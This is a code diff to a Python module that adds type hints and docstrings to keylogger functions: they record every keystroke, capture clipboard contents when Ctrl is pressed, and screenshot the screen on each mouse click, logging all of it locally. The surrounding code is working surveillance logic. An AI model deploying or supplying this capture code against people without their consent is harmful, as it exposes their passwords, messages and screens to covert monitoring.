@@ -14,7 +14,17 @@ from utils.writeLog import writeLog, writeAppLog
 import time
 
 # ========== On Press Function ==========
-def onPress(key):
+def onPress(key: keyboard.Key) -> None:
+    
+    """
+    This function will be called when a key is pressed.
+    
+    It will take one parameter:
+    1. key: The key that is pressed.
+    
+    It will return nothing.
+    """
+    
     try:
         key =  key.char
     except AttributeError:
@@ -30,7 +40,17 @@ def onPress(key):
         writeLog(key)
         
 # ========= On Paste Function ==========
-def onPaste(key):
+def onPaste(key: keyboard.Key) -> None:
+    
+    """
+    This function will be called when a user pastes something.
+    
+    It will take one parameter:
+    1. key: The key that is pressed.
+    
+    It will return nothing.    
+    """
+    
     try:
         if key == keyboard.Key.ctrl_l:
             clipboard_text = pyperclip.paste()
@@ -39,17 +59,44 @@ def onPaste(key):
         writeAppLog(f'Error while pasting: {e}')
 
 # ========== Function to record clipboard ==========
-def recordClipboard():
+def recordClipboard() -> None:
+    
+    """
+    This function will record the clipboard.
+    
+    It will return nothing.
+    """
+    
     with keyboard.Listener(on_release=onPaste) as listener:
         listener.join()
 
 # ========== Function to record keystrokes ==========
-def recordKeyStrokes():
+def recordKeyStrokes() -> None:
+    
+    """
+    This function will record the keystrokes.
+    
+    It will return nothing.
+    """
+    
     with keyboard.Listener(on_press=onPress) as listener:
         listener.join()
 
 # ========== On click Function ==========
-def onClick(x, y, button, pressed):
+def onClick(x, y, button, pressed) -> None:
+    
+    """
+    This function will be called when a mouse click is detected.
+    
+    It will take four parameters:
+    1. x: The x coordinate of the mouse.
+    2. y: The y coordinate of the mouse.
+    3. button: The button that is clicked.
+    4. pressed: If the button is pressed or not.
+    
+    It will return nothing.
+    """
+    
     try:
         if not os.path.exists('./screenshots'):
             os.makedirs('./screenshots')
@@ -63,6 +110,13 @@ def onClick(x, y, button, pressed):
         writeLog(f'Error while taking screenshot: {e}')
 
 # ========== Function to record mouse clicks ==========
-def recordMouseClicks():
+def recordMouseClicks() -> None:
+    
+    """
+    This function will record the mouse clicks.
+    
+    It will return nothing.
+    """
+    
     with mouse.Listener(on_click=onClick) as listener:
         listener.join()
